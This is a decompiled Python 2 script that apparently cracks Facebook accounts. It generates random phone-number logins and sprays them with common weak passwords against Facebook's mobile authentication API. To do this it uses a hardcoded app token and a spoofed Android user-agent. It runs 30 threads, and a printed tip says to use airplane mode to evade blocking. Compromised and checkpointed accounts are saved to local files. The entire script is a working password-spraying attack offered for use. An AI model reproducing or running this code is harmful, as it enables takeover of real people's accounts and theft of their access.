# Decompile by Mr. NIKI:)
# Next Ablami mat karna
# Time Succes decompile : 2022-01-03 16:22:26.681176
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    os.system('python2 old.py')
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]')]
logo = '\n         \x1b[1;97m   888888   ######  ########  \n         \x1b[1;97m  88    88 ##    ## ##     ## \n         \x1b[1;97m  88       ##       ##     ## \n         \x1b[1;97m   888888   ######  ########  \n         \x1b[1;97m        88       ## ##     ## \n         \x1b[1;97m  88    88 ##    ## ##     ## \n         \x1b[1;97m   888888   ######  ########                                     \n\x1b[1;97m------------------------\x1b[1;97m------------------------\n\x1b[1;91m[!]\x1b[1;97m Author \x1b[1;97m  : \x1b[1;97m          Sarfraz Baloch\n\x1b[1;91m[!]\x1b[1;97m Facebook\x1b[1;97m:  \x1b[1;97m          Sarfraz Baloch\n\x1b[1;91m[!]\x1b[1;97m GitHub\x1b[1;97m  : \x1b[1;97m           Sarfraz-Baloch\n\x1b[1;91m[!]\x1b[1;97m Version\x1b[1;97m : \x1b[1;97m             5.0.0\n\x1b[1;97m------------------------\x1b[1;97m------------------------\n                                                 '
back = 0
oks = []
id = []
cpb = []
def menu():
    os.system('clear')
    print logo
    print '\x1b[1;97m-----------------------------------------------------'
    print
    print '\x1b[1;97m[1] Press 1 '
    print
    print '\x1b[1;97m-----------------------------------------------------'
    main()
def main():
    global cpb
    global oks
    ss = raw_input('\x1b[1;97m>>>> ')
    if ss == '':
        print '[!] select valid option'
        main()
    elif ss == '1':
        os.system('clear')
        print logo
        try:
            c = raw_input('\x1b[1;97mCode : ')
            k = '10000000'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('Back ')
            menu()
    elif ss == '0':
        menu()
    else:
        print '[!] Select valid option'
        menu()
    os.system('clear')
    print logo
    print '\x1b[1;91m   Use flight (airplane) mode before use'
    print '\x1b[1;97m-----------------------------------------------------'
    sss = str(len(id))
    print '\x1b[1;97m              TOTAL IDS :\x1b[1;92m ' + sss
    print '\x1b[1;97m-----------------------------------------------------'
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            s = json.load(data)
            if 'access_token' in s:
                print '\x1b[1;92m  [SSB_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/SS_CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in s['error_msg']:
                print '\x1b[1;91m  [SSB_CP] ' + k + c + user + '  |  ' + pass1
                cps = open('save/SS_CP.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234567'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                s = json.load(data)
                if 'access_token' in s:
                    print '\x1b[1;92m  [SSB_OK] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/SS_OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in s['error_msg']:
                    print '\x1b[1;91m  [SSB_CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/SS_CP.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '12345678'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    s = json.load(data)
                    if 'access_token' in s:
                        print '\x1b[1;92m  [SSB_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/SS_CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in s['error_msg']:
                        print '\x1b[1;91m  [SSB_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/SS_CP.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '123456789'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        s = json.load(data)
                        if 'access_token' in s:
                            print '\x1b[1;92m  [SSB_OK]  ' + k + c + user + '  |  ' + pass4
                            okb = open('save/SS_OK.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in s['error_msg']:
                            print '\x1b[1;91m  [SSB_CP] ' + k + c + user + '  |  ' + pass4
                            cps = open('save/SS_CP.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m-----------------------------------------------------'
    print 'Process Has Been Completed ...'
    print 'Total OK : ' + str(len(oks))
    print 'Total CP : ' + str(len(cpb))
    print '\x1b[1;97m-----------------------------------------------------'
    raw_input('\x1b[1;97mPress enter to back SSB Menu ')
    menu()
if __name__ == '__main__':
    menu()
# Mau Ngapain Cuk?
